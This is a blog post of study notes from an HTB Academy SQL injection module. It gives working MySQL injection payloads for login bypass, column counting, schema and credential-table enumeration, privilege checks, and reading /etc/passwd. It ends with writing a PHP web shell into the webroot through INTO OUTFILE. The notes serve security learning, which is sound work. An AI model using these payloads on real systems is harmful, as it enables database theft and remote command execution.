---
title: "SQLi fundamentals"
date: 2026-01-31 12:00:00 +0300
categories: [Writeups, HTB Academy]
tags: [htb-academy, notes, cybersecurity, pentesting, methodology]
description: "In-band SQL injection detection, UNION-based data exfiltration, database fingerprinting, and schemata extraction."
image:
  path: /assets/img/posts/sqli.jpg
  alt: SQLi fundamentals
---

Since we caused an error, this may mean that the page is vulnerable to SQL injection.

most basic way

```bash
something' or '1' ='1
do not forget to try
something')
```

we can also use comment lines to bypass rest of the query

```bash
something' -- ...
or
something' # ...
the # can need url encoding
```

# **Detect number of columns**

Before going ahead and exploiting Union-based queries, we need to find the number of columns selected by the server. There are two methods of detecting the number of columns:

- Using `ORDER BY`
- Using `UNION`

### **Using ORDER BY**

The first way of detecting the number of columns is through the `ORDER BY` function, which we discussed earlier. We have to inject a query that sorts the results by a column we specified, 'i.e., column 1, column 2, and so on', until we get an error saying the column specified does not exist.

For example, we can start with `order by 1`, sort by the first column, and succeed, as the table must have at least one column. Then we will do `order by 2` and then `order by 3` until we reach a number that returns an error, or the page does not show any output, which means that this column number does not exist. The final successful column we successfully sorted by gives us the total number of columns.

### **Using UNION**

The other method is to attempt a Union injection with a different number of columns until we successfully get the results back. The first method always returns the results until we hit an error, while this method always gives an error until we get a success. We can start by injecting a 3 column `UNION` query:

```sql
cn' UNION select 1,2,3-- -
```

this gave an error

```sql
cn' UNION select 1,2,3,4-- -

```

This time we successfully get the results, meaning once again that the table has 4 columns. We can use either method to determine the number of columns. Once we know the number of columns, we know how to form our payload, and we can proceed to the next step.

### **Location of Injection**

While a query may return multiple columns, the web application may only display some of them. So, if we inject our query in a column that is not printed on the page, we will not get its output. This is why we need to determine which columns are printed to the page, to determine where to place our injection. In the previous example, while the injected query returned 1, 2, 3, and 4, we saw only 2, 3, and 4 displayed back to us on the page as the output data:

## mysql fingerprinting

As we cover `MySQL` in this module, let us fingerprint `MySQL` databases. The following queries and their output will tell us that we are dealing with `MySQL`:

| **Payload** | **When to Use** | **Expected Output** | **Wrong Output** |
| --- | --- | --- | --- |
| `SELECT @@version` | When we have full query output | MySQL Version 'i.e. `10.3.22-MariaDB-1ubuntu1`' | In MSSQL it returns MSSQL version. Error with other DBMS. |
| `SELECT POW(1,1)` | When we only have numeric output | `1` | Error with other DBMS |
| `SELECT SLEEP(5)` | Blind/No Output | Delays page response for 5 seconds and returns `0`. | Will not delay response with other DBMS |

# **SCHEMATA**

To start our enumeration, we should find what databases are available on the DBMS. The table [SCHEMATA](https://dev.mysql.com/doc/refman/8.0/en/information-schema-schemata-table.html) in the `INFORMATION_SCHEMA` database contains information about all databases on the server. It is used to obtain database names so we can then query them. The `SCHEMA_NAME` column contains all the database names currently present.

Let us first test this on a local database to see how the query is used:

Database Enumeration

```bash
mysql> SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;

+--------------------+
| SCHEMA_NAME        |
+--------------------+
| mysql              |
| information_schema |
| performance_schema |
| ilfreight          |
| dev                |
+--------------------+
6 rows in set (0.01 sec)

```

We see the `ilfreight` and `dev` databases.

Note: The first three databases are default MySQL databases and are present on any server, so we usually ignore them during DB enumeration. Sometimes there's a fourth 'sys' DB as well.

### finding current db

We can find the current database with the `SELECT database()` query. We can do this similarly to how we found the DBMS version in the previous section:

Code: sql

```sql
cn' UNION select 1,database(),2,3-- -
```

### **TABLES**

Before we dump data from the `dev` database, we need to get a list of the tables to query them with a `SELECT` statement. To find all tables within a database, we can use the `TABLES` table in the `INFORMATION_SCHEMA` Database.

The [TABLES](https://dev.mysql.com/doc/refman/8.0/en/information-schema-tables-table.html) table contains information about all tables throughout the database. This table contains multiple columns, but we are interested in the `TABLE_SCHEMA` and `TABLE_NAME` columns. The `TABLE_NAME` column stores table names, while the `TABLE_SCHEMA` column points to the database each table belongs to. This can be done similarly to how we found the database names. For example, we can use the following payload to find the tables within the `dev` database:

Code: sql

```sql
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -

```

### **COLUMNS**

To dump the data of the `credentials` table, we first need to find the column names in the table, which can be found in the `COLUMNS` table in the `INFORMATION_SCHEMA` database. The [COLUMNS](https://dev.mysql.com/doc/refman/8.0/en/information-schema-columns-table.html) table contains information about all columns present in all the databases. This helps us find the column names to query a table for. The `COLUMN_NAME`, `TABLE_NAME`, and `TABLE_SCHEMA` columns can be used to achieve this. As we did before, let us try this payload to find the column names in the `credentials` table:

Code: sql

```sql
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
```

### whoami

```bash
cn' UNION SELECT 1, user(), 3, 4-- -
```

### privilege questioning

```bash
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -

```

The query returns `Y`, which means `YES`, indicating superuser privileges. We can also dump other privileges we have directly from the schema, with the following query:

Code: sql

```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
```

```bash
cn' UNION SELECT 1, grantee, privilege_type, 4
 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -

```

### load_file lookup

Note: We will only be able to read the file if the OS user running MySQL has enough privileges to read it.

Similar to how we have been using a `UNION` injection, we can use the above query:

Code: sql

```sql
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```

### **secure_file_priv**

The [secure_file_priv](https://mariadb.com/kb/en/server-system-variables/#secure_file_priv) variable is used to determine where to read/write files from. An empty value lets us read files from the entire file system. Otherwise, if a certain directory is set, we can only read from the folder specified by the variable. On the other hand, `NULL` means we cannot read/write from any directory. MariaDB has this variable set to empty by default, which lets us read/write to any file if the user has the `FILE` privilege. However, `MySQL` uses `/var/lib/mysql-files` as the default folder. This means that reading files through a `MySQL` injection isn't possible with default settings. Even worse, some modern configurations default to `NULL`, meaning that we cannot read/write files anywhere within the system.

So, let's see how we can find out the value of `secure_file_priv`. Within `MySQL`, we can use the following query to obtain the value of this variable:

Code: sql

```sql
SHOW VARIABLES LIKE 'secure_file_priv';

```

We have to select these two columns from that table in the `INFORMATION_SCHEMA` database. There are hundreds of global variables in a MySQL configuration, and we don't want to retrieve all of them. We will then filter the results to only show the `secure_file_priv` variable, using the `WHERE` clause we learned about in a previous section.

The final SQL query is the following:

Code: sql

```sql
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
```

# **Writing Files through SQL Injection**

Let's try writing a text file to the webroot and verify if we have write permissions. The below query should write `file written successfully!` to the `/var/www/html/proof.txt` file, which we can then access on the web application:

Code: sql

```sql
select 'file written successfully!' into outfile '/var/www/html/proof.txt'

```

### Web directory finding

necessary for web shell etc. find the configs, then for example for nginx with etc/nginx/sites-enabled/default we can find root web directory. then web shell to that directory with the name of your filename do not forget

**Note:** To write a web shell, we must know the base **web directory** for the web server (i.e. web root). One way to find it is to use `load_file` to read the server configuration, like Apache's configuration found at `/etc/apache2/apache2.conf`, Nginx's configuration at `/etc/nginx/nginx.conf`, or IIS configuration at `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`, or we can search online for other possible configuration locations. Furthermore, we may run a fuzzing scan and try to write files to different possible web roots, using [this wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) or [this wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt). Finally, if none of the above works, we can use server errors displayed to us and try to find the web directory that way.

# **Writing a Web Shell**

Having confirmed write permissions, we can go ahead and write a PHP web shell to the webroot folder. We can write the following PHP webshell to be able to execute commands directly on the back-end server:

Code: php

```php
<?php system($_REQUEST[0]); ?>

```

We can reuse our previous `UNION` injection payload, and change the string to the above, and the file name to `shell.php`:

Code: sql

```sql
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -

```

DO NOT URL ENCODE PHP THING
